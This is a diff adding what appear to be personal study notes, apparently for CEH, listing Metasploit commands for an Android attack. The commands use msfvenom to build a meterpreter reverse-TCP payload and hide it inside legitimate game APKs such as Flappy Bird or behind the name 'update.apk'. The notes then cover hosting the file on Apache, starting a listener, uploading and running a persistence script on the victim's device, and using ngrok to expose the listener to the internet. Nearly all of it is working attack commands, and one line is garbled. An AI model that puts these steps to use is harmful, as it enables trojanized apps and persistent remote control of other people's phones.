@@ -1,0 +1,21 @@
+msfvenom --list payload
+msfvenom -x /home/ali/Downloads/flappy.apk --platform android/meterpreter/reverse_tcp -a delvek lhost=192.168.1.9 lport=1234  -o app.apk
+msfvenom -p android/meterpreter/reverse_tcp lhost=attacker_ip lport=1234 -o update.apk(creating payload)
+cp update.apk /var/www/html(for local attack)
+service apache2 start
+msfconsole (start metasploit)
+use multi/handler
+set payload android/meterpreter/reverse_tcp (set the payload)
+show options
+set lhost attacker_ip
+set lport 1234
+exploit
+cd /sdcard
+upload /home/ali/Desktop/CEH/persistance.sh
+shell
+sh persistance.sh
+msfvenom -x flappybird.apk -p android/meterpreter/reverse_tcp lhost=attacker_ip lport=1234 -o flappybird1.apk
+./ngrok tcp 1234 (i am now online)
+msfvenom -x flappy.apk -p android/meterpreter/reverse_tcp lhost=(public ip from ngrok) lport=(from ngrok) -o flappy2.apk
+mv app.apk /var/www/html(important)
+-------------------------------------------------------------
